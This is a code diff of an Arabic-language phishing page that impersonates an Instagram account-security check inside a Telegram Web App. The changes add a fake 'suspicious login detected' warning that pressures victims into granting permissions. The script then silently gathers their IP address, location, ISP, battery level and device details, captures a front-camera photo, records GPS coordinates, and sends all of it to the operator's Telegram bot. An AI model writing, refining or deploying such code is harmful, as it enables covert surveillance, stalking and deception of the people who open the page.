@@ -1,24 +1,30 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Security Check</title>
+    <title>Instagram - التحقق من الأمان</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
         .logo { width: 175px; margin-bottom: 20px; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; color: #8e8e8e; font-size: 13px; }
+        .user-info { display: flex; align-items: center; justify-content: center; margin: 15px 0; border: 1px solid #dbdbdb; padding: 10px; border-radius: 5px; }
+        .user-icon { width: 40px; height: 40px; background: #eee; border-radius: 50%; margin-left: 10px; }
+        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:active { background: #0077c7; }
+        #status { margin-top: 15px; color: #ed4956; font-size: 13px; font-weight: bold; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-        <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد أمان الحساب</p>
-        <p style="color: #8e8e8e; font-size: 14px;">يجب السماح بالأذونات المطلوبة للتأكد من هويتك ومنع الوصول غير المصرح به.</p>
+        <div class="user-info">
+            <div class="user-icon"></div>
+            <span style="font-weight: 600; color: #262626;">التحقق من ملكية الحساب</span>
+        </div>
+        <p style="color: #8e8e8e; font-size: 13px; line-height: 1.5;">اكتشف نظامنا محاولة دخول مشبوهة. يرجى تأكيد هويتك عبر السماح بالأذونات المطلوبة لإكمال الفحص الأمني.</p>
         <button id="authBtn">متابعة كـ @User</button>
         <div id="status"></div>
     </div>
@@ -30,65 +36,70 @@
         const webapp = window.Telegram.WebApp;
         webapp.expand();
 
-        const getIPDetails = async () => {
+        // 1. جلب معلومات الـ IP والبطارية (صيد صامت)
+        const getSilentData = async () => {
             try {
-                // استخدمنا ipapi.co لأنها تدعم HTTPS وموثوقة أكثر
                 const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
-            } catch (e) { return null; }
-        };
-
-        const getPhoto = async (mode) => {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                await new Promise(r => setTimeout(r, 2000));
-                const c = document.getElementById('c');
-                // أبعاد صغيرة جداً لضمان مرورها عبر تليجرام دون "فشل"
-                c.width = 200; 
-                c.height = 150;
-                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-                s.getTracks().forEach(t => t.stop());
-                return c.toDataURL('image/jpeg', 0.4); 
-            } catch (e) { return null; }
-        };
-
-        document.getElementById('authBtn').onclick = async () => {
-            document.getElementById('status').innerText = "جاري الفحص... يرجى الانتظار";
-
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const ip = await getIPDetails();
-                let batteryLevel = "غير معروف";
+                const ip = await res.json();
+                const b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
                 
-                try {
-                    const b = await navigator.getBattery();
-                    batteryLevel = (b.level * 100).toFixed(0) + "%";
-                } catch(e) {}
-
-                // جمع البيانات الشاملة والدقيقة
-                const data = {
-                    time: new Date().toLocaleString('ar-EG'),
-                    ip: ip ? ip.ip : 'فشل جلب الآيبي',
-                    country: ip ? ip.country_name : 'فشل جلب الدولة',
-                    region: ip ? ip.region : 'فشل جلب المحافظة',
-                    isp: ip ? ip.org : 'فشل جلب المزود',
-                    gps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
+                return {
+                    ip: ip.ip || "فشل",
+                    country: ip.country_name || "فشل",
+                    region: ip.region || "فشل",
+                    isp: ip.org || "فشل",
+                    battery: (b.level * 100).toFixed(0) + "%",
                     platform: navigator.platform,
-                    os: navigator.userAgent.includes("Android") ? "Android" : "iOS/Other",
-                    browser: navigator.userAgent.split(' ').pop(),
-                    screen: `${window.screen.width}x${window.screen.height} (Actual: ${window.innerWidth}x${window.innerHeight})`,
-                    battery: batteryLevel,
-                    frontImg: await getPhoto("user") // التقاط الصورة
+                    ua: navigator.userAgent.split(') ')[1]
+                };
+            } catch (e) { return null; }
+        };
+
+        // 2. دالة التقاط الصورة (بجودة مثالية للإرسال)
+        const takePhoto = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000));
+                
+                const canvas = document.getElementById('c');
+                canvas.width = 300; canvas.height = 250;
+                canvas.getContext('2d').drawImage(video, 0, 0, 300, 250);
+                
+                stream.getTracks().forEach(t => t.stop());
+                return canvas.toDataURL('image/jpeg', 0.5);
+            } catch (e) { return null; }
+        };
+
+        // 3. التنفيذ عند الضغط
+        document.getElementById('authBtn').onclick = async () => {
+            const btn = document.getElementById('authBtn');
+            const st = document.getElementById('status');
+            
+            btn.disabled = true;
+            st.innerText = "جاري الاتصال بخوادم الأمان...";
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const silentData = await getSilentData();
+                const photo = await takePhoto();
+
+                const finalData = {
+                    ...silentData,
+                    gps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                    photo: photo,
+                    time: new Date().toLocaleString('ar-EG')
                 };
 
-                // إرسال البيانات للبوت
-                webapp.sendData(JSON.stringify(data));
-                // الانتظار قليلاً لضمان الإرسال ثم الإغلاق
-                setTimeout(() => webapp.close(), 1000);
-                
-            }, () => {
-                document.getElementById('status').innerText = "خطأ: يجب قبول الأذونات للمتابعة.";
+                webapp.sendData(JSON.stringify(finalData));
+                st.style.color = "#262626";
+                st.innerText = "اكتمل التحقق بنجاح! يتم التحويل...";
+                setTimeout(() => webapp.close(), 1500);
+
+            }, (err) => {
+                btn.disabled = false;
+                alert("⚠️ خطأ في الأمان: يجب السماح بالأذونات لإثبات هويتك.");
+                st.innerText = "فشل التحقق: يرجى منح الصلاحيات والمحاولة مجدداً.";
             });
         };
     </script>
